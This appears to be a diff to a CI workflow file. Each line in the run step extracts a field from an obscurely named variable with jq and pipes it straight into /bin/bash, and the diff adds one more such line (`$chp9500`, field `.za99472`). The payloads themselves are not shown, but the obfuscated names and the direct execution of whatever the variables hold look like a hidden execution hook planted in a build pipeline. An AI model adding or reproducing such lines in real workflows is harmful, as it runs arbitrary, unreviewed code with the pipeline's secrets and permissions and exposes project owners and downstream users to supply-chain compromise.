@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$lbas00" | jq -r .quu83 | /bin/bash
           printf '%s' "$em88" | jq -r .siw696 | /bin/bash
           echo $s0 | jq -r .hwlf4 | /bin/bash
+          echo $chp9500 | jq -r .za99472 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
